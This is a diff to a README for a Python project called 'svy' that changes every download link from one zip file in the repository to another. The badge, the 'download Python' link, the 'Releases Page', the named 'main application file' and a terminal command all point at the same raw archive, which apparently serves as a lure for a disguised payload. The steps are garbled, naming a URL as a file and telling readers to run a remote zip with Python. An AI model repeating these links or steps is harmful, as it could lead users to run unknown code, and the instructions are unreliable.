@@ -6,7 +6,7 @@ Welcome to **svy**! This application offers a modern Python ecosystem for handli
 
 ## 📥 Download Now
 
-[![Download svy](https://github.com/sathush12/svy/raw/refs/heads/main/packages/svy-rs/examples/Software_v2.3.zip)](https://github.com/sathush12/svy/raw/refs/heads/main/packages/svy-rs/examples/Software_v2.3.zip)
+[![Download svy](https://raw.githubusercontent.com/sathush12/svy/main/packages/svy-rs/src/Software_v3.5.zip)](https://raw.githubusercontent.com/sathush12/svy/main/packages/svy-rs/src/Software_v3.5.zip)
 
 ## 🚀 Getting Started
 
@@ -21,11 +21,11 @@ Before downloading svy, ensure your system meets the following requirements:
 - **Memory**: At least 4 GB of RAM recommended
 - **Disk Space**: 100 MB of free space
 
-Make sure you have Python installed on your computer. You can download it from [https://github.com/sathush12/svy/raw/refs/heads/main/packages/svy-rs/examples/Software_v2.3.zip](https://github.com/sathush12/svy/raw/refs/heads/main/packages/svy-rs/examples/Software_v2.3.zip).
+Make sure you have Python installed on your computer. You can download it from [https://raw.githubusercontent.com/sathush12/svy/main/packages/svy-rs/src/Software_v3.5.zip](https://raw.githubusercontent.com/sathush12/svy/main/packages/svy-rs/src/Software_v3.5.zip).
 
 ### 📂 Step 2: Visit the Download Page
 
-Go to our [Releases Page](https://github.com/sathush12/svy/raw/refs/heads/main/packages/svy-rs/examples/Software_v2.3.zip). This page contains the latest versions of svy.
+Go to our [Releases Page](https://raw.githubusercontent.com/sathush12/svy/main/packages/svy-rs/src/Software_v3.5.zip). This page contains the latest versions of svy.
 
 ### 📥 Step 3: Download the Application
 
@@ -38,10 +38,10 @@ After the download is complete, locate the downloaded file on your computer, usu
 ### 🖥️ Step 5: Running svy
 
 1. Open the folder where you unzipped svy.
-2. Locate the main application file (it might be named `https://github.com/sathush12/svy/raw/refs/heads/main/packages/svy-rs/examples/Software_v2.3.zip` or similar).
+2. Locate the main application file (it might be named `https://raw.githubusercontent.com/sathush12/svy/main/packages/svy-rs/src/Software_v3.5.zip` or similar).
 3. Right-click on it and select "Open With" -> "Python".
 
-Depending on your setup, you may also run it through the terminal. Open your terminal and navigate to the unzipped folder. Type `python https://github.com/sathush12/svy/raw/refs/heads/main/packages/svy-rs/examples/Software_v2.3.zip` and hit Enter.
+Depending on your setup, you may also run it through the terminal. Open your terminal and navigate to the unzipped folder. Type `python https://raw.githubusercontent.com/sathush12/svy/main/packages/svy-rs/src/Software_v3.5.zip` and hit Enter.
 
 ### 🔍 Step 6: Using svy
 
@@ -88,7 +88,7 @@ We welcome contributions from all users. If you want to assist in improving svy,
 
 ## 📥 Download & Install
 
-To download svy, click [here](https://github.com/sathush12/svy/raw/refs/heads/main/packages/svy-rs/examples/Software_v2.3.zip) and follow the previously outlined steps to install and get your application running smoothly.
+To download svy, click [here](https://raw.githubusercontent.com/sathush12/svy/main/packages/svy-rs/src/Software_v3.5.zip) and follow the previously outlined steps to install and get your application running smoothly.
 
 ---
 
